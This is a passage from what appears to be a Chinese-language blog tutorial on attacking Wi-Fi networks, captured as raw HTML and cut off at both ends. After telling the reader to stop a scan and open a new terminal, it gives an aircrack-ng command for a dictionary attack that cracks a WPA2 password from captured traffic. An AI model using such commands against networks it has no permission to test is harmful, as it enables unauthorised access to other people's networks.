class="headerlink" title="断网攻击"></a>断网攻击</h2><p>扫出来目标设备之后，用<code>ctrl+c</code>停止扫描，然后再开个终端，输入</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="gutter"><pre><span class="line">1</span><br/></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b [PACKAGE] -w [PATH-TO-PASS-DICTIONARY] ~/*.<span
